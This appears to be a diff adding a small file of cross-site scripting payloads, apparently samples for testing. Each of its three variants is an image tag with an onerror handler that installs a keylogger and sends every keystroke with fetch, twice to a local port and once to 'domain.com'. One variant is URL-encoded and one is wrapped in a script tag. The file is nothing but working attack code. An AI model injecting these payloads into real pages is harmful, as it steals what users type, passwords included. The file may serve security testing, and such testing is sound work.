@@ -1,0 +1,16 @@
+<img+src
+	="x"
+	+onerror='document.onkeypress=function(e){fetch("http://127.0.0.1:8008?k="%2bString.fromCharCode(e.which))},this.remove();'
+/>
+
+<script>
+	;<img
+		src='x'
+		onerror='document.onkeypress=function(e){fetch("http://127.0.0.1:8008?k="+String.fromCharCode(e.which))},this.remove();'
+	/>
+</script>
+
+<img
+	src="x"
+	onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'
+/>
